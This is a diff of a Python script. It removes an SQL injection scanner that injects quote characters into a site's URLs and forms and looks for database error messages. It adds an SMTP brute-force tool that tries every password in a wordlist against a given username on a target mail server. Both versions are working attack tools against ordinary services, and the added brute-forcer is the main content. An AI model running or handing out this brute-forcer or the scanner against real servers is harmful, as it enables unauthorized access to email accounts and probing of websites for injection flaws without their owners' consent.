@@ -1,134 +1,57 @@
-import requests
-from bs4 import BeautifulSoup as bs
-from urllib.parse import urljoin, quote
-from pprint import pprint
+import smtplib
 import argparse
+from time import sleep
 
-# Initialize an HTTP session & set the browser
-s = requests.Session()
-s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36"
-
-def get_all_forms(url):
-    """Given a `url`, it returns all forms from the HTML content"""
-    soup = bs(s.get(url).content, "html.parser")
-    return soup.find_all("form")
-
-def get_form_details(form):
+def brute_force_smtp(target, username, wordlist):
     """
-    This function extracts all possible useful information about an HTML `form`
+    Function to perform brute force attack on SMTP server with provided username and password wordlist
+    Args:
+    - target: SMTP server address (e.g., 'smtp.example.com')
+    - username: the username to use in the brute-force attempt
+    - wordlist: list of potential passwords to try
     """
-    details = {}
-    # Get the form action (target URL)
-    action = form.attrs.get("action", None)
-    if action:
-        action = action.lower()
-
-    # Get the form method (POST, GET, etc.)
-    method = form.attrs.get("method", "get").lower()
-
-    # Get all the input details such as type and name
-    inputs = []
-    for input_tag in form.find_all("input"):
-        input_type = input_tag.attrs.get("type", "text")
-        input_name = input_tag.attrs.get("name")
-        input_value = input_tag.attrs.get("value", "")
-        inputs.append({"type": input_type, "name": input_name, "value": input_value})
-
-    # Put everything in the resulting dictionary
-    details["action"] = action
-    details["method"] = method
-    details["inputs"] = inputs
-    return details
-
-def is_vulnerable(response):
-    """A simple boolean function that determines whether a page is SQL Injection vulnerable from its `response`"""
-    errors = {
-        # MySQL
-        "you have an error in your sql syntax;",
-        "warning: mysql",
-        # SQL Server
-        "unclosed quotation mark after the character string",
-        # Oracle
-        "quoted string not properly terminated",
-    }
-    if response.status_code != 200:
-        return False  # Non-200 status codes are unlikely to indicate SQLi
-
-    # Look for SQLi-related error messages in the response content
-    for error in errors:
-        if error in response.content.decode().lower():
-            return True
-
-    # No error detected
-    return False
-
-def scan_sql_injection(url):
-    # Test on URL
-    for c in "\"'":
-        # URL encode the quote character
-        new_url = f"{url}{quote(c)}"  # Ensure proper encoding
-        print("[!] Trying", new_url)
-        # Make the HTTP request
-        try:
-            res = s.get(new_url)
-            if is_vulnerable(res):
-                # SQL Injection detected on the URL itself, no need to proceed for extracting forms
-                print("[+] SQL Injection vulnerability detected, link:", new_url)
-                return
-        except requests.exceptions.RequestException as e:
-            print(f"[-] Error with URL {new_url}: {e}")
-            continue
-
-    # Test on HTML forms
-    forms = get_all_forms(url)
-    print(f"[+] Detected {len(forms)} forms on {url}.")
-    for form in forms:
-        form_details = get_form_details(form)
-        for c in "\"'":
-            # The data body we want to submit
-            data = {}
-            for input_tag in form_details["inputs"]:
-                if input_tag["type"] == "hidden" or input_tag["value"]:
-                    # Any input form that is hidden or has some value, just use it in the form body
-                    try:
-                        data[input_tag["name"]] = input_tag["value"] + c
-                    except:
-                        pass
-                elif input_tag["type"] != "submit":
-                    # All others except submit, use some junk data with special character
-                    data[input_tag["name"]] = f"test{quote(c)}"  # Ensure proper encoding
-
-            # Join the URL with the action (form request URL)
-            action_url = urljoin(url, form_details["action"])  # Use `action_url` instead of overwriting `url`
-
-            if form_details["method"] == "post":
-                try:
-                    res = s.post(action_url, data=data)
-                except requests.exceptions.RequestException as e:
-                    print(f"[-] Error with POST request to {action_url}: {e}")
-                    continue
-            elif form_details["method"] == "get":
-                try:
-                    res = s.get(action_url, params=data)
-                except requests.exceptions.RequestException as e:
-                    print(f"[-] Error with GET request to {action_url}: {e}")
-                    continue
-
-            # Test whether the resulting page is vulnerable
-            if is_vulnerable(res):
-                print("[+] SQL Injection vulnerability detected, link:", action_url)
-                print("[+] Form:")
-                pprint(form_details)
+    try:
+        # Establish connection to the SMTP server
+        server = smtplib.SMTP(target, 25)
+        server.set_debuglevel(0)
+        print(f"Attempting to brute force on {target} with username {username}")
+        
+        for password in wordlist:
+            try:
+                server.login(username, password)
+                print(f"Success: Found password '{password}'")
                 break
+            except smtplib.SMTPAuthenticationError:
+                print(f"Failed: {password}")
+                sleep(1)  # Delay to prevent rapid-fire requests
+            except Exception as e:
+                print(f"Error occurred: {e}")
+                break
+        
+        server.quit()
+    except Exception as e:
+        print(f"Error connecting to server: {e}")
 
 def main():
-    # Set up command-line argument parsing
-    parser = argparse.ArgumentParser(description="SQL Injection Scanner")
-    parser.add_argument('-u', '--url', required=True, help="URL to scan for SQL Injection vulnerabilities")
+    # Setup argument parser
+    parser = argparse.ArgumentParser(description="SMTP Brute Forcer")
+    parser.add_argument("target", help="SMTP server address (e.g., smtp.example.com)")
+    parser.add_argument("username", help="Username to attempt to brute force")
+    parser.add_argument("wordlist", help="File containing password wordlist (one password per line)")
+
     args = parser.parse_args()
 
-    # Run the scan with the given URL
-    scan_sql_injection(args.url)
+    # Read password list from the given wordlist file
+    try:
+        with open(args.wordlist, 'r') as file:
+            passwords = file.readlines()
+            passwords = [line.strip() for line in passwords]  # Remove newline characters
+    except FileNotFoundError:
+        print("Wordlist file not found!")
+        return
+
+    # Perform brute force attack
+    brute_force_smtp(args.target, args.username, passwords)
 
 if __name__ == "__main__":
     main()
